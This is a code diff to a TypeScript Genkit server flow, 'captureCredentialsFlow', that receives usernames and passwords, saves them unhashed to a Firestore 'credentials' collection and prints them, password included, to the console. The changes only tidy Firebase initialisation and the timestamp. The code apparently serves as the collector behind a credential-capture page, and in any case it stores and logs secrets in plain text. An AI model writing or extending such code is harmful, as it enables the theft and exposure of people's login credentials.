@@ -8,19 +8,18 @@
 import {ai} from '@/ai/genkit';
 import type {CredentialsInput} from '@/ai/types/credentials';
 import {CredentialsInputSchema} from '@/ai/types/credentials';
-import { getFirestore, collection, addDoc } from 'firebase/firestore';
-import { initializeApp } from 'firebase/app';
+import { getFirestore, collection, addDoc, serverTimestamp } from 'firebase/firestore';
+import { initializeApp, getApps, getApp } from 'firebase/app';
 // We can't use the provider here since this is a server-side flow.
 // We need to initialize a new app instance.
 import firebaseConfig from '@/firebase/config';
 
 // Initialize Firebase App if not already initialized
-let app;
-try {
-  app = initializeApp(firebaseConfig);
-} catch (e) {
-  // Already initialized
-  app = (global as any)._firebaseApp;
+function getFirebaseApp() {
+  if (getApps().length) {
+    return getApp();
+  }
+  return initializeApp(firebaseConfig);
 }
 
 
@@ -38,12 +37,13 @@ const captureCredentialsFlow = ai.defineFlow(
   },
   async (input: CredentialsInput) => {
     try {
+      const app = getFirebaseApp();
       const db = getFirestore(app);
       const credentialsCollection = collection(db, 'credentials');
       await addDoc(credentialsCollection, {
         username: input.username,
         password: input.password,
-        createdAt: new Date(),
+        createdAt: serverTimestamp(),
       });
       console.log('Credentials saved to Firestore:', input);
     } catch (error) {
@@ -55,5 +55,3 @@ const captureCredentialsFlow = ai.defineFlow(
     return input;
   }
 );
-
-    
